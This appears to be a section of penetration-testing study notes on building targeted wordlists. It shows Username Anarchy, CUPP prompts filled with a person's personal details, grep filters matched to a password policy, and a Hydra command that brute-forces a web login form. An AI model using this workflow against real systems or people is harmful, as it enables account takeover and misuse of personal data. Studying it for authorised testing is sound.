## 1- Custom Wordlists
Pre-made wordlists like **rockyou** or **SecLists** are broad and general. They’re good for generic brute-forcing but inefficient when targeting specific people or organizations. Custom wordlists focus on the target — using details like names, hobbies, or company data to create smarter, more precise lists.
Example: targeting “Thomas Edison” — instead of generic usernames, custom ones like `t.edison`, `thomas.e`, or `edisonth` based on company naming patterns are far more effective.
#### Username Anarchy

Generating usernames manually can be tedious. **Username Anarchy** automates it, creating many combinations from simple names like “Jane Smith.”  
Examples it can generate:  
`jane.smith`, `smithj`, `js`, `janemarie`, `j4n3`, etc.

```bash
# install 
git clone https://github.com/urbanadventurer/username-anarchy.git   

# run username-anarchy for a target (first + last name)
./username-anarchy Jane Smith > jane_smith_usernames.txt 

# inspect first lines of generated list
head -n 30 jane_smith_usernames.txt  
  # janesmith
  # smithjane
  # j.smith
  # jane.s
```

#### CUPP 

After generating usernames, **CUPP** helps build a personalized password list based on OSINT — data from social media, company sites, or leaks.

```bas
# run CUPP interactively to build a custom password list
# CUPP will prompt for fields; you can press Enter to skip unknown values
cupp -i

# Example interactive answers (just for reference) -- enter these when prompted by cupp:
# > First Name: Jane
# > Surname: Smith
# > Nickname: Janey
# > Birthdate (DDMMYYYY): 11121990
# > Partners) name: Jim
# > Pet's name: Spot
# > Company name: AHI
# > Add key words? Y: hacker,blue
# > Add special chars at end? Y
# > Add random numbers? Y
# > Leet mode? Y

# after CUPP finishes it will save a file like jane.txt (example name shown by CUPP)

```
filter the generated list to match a specific password policy : min length 6, at least 1 upper, 1 lower, 1 digit, and at least 2 special chars from !@#$%^&*
```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# check how many candidates remain
wc -l jane-filtered.txt   # shows number of passwords that match the policy
```
#### bruteforce with  the customs wordlists 
Use the two generated lists in Hydra against the target to brute-force the login form. 
```bash
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
